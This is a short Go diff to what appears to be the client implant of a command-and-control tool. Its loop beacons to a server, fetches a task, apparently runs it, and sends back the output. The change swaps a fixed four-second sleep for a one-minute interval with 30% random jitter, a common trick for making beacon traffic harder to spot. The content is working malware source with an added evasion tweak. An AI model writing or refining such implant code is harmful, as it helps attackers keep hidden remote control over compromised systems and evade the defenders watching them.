@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"c2-server/models"
 	"encoding/json"
+	"math/rand"
 	"net/http"
 	"os"
 	"os/exec"
@@ -64,10 +65,14 @@ func sendAnswer(id string, cmd string) {
 }
 
 func main() {
+	base := 1 * time.Minute
+	jitter := 30
 	for {
+		jitterRange := (int(base.Seconds()) * jitter) / 100
+		sleepSec := int(base.Seconds()) + rand.Intn(2*jitterRange) - jitterRange
 		resp := sendBeacon("1234")
 		cmd := recvTask(resp)
 		sendAnswer("1234", cmd)
-		time.Sleep(4 * time.Second)
+		time.Sleep(time.Duration(sleepSec) * time.Second)
 	}
 }
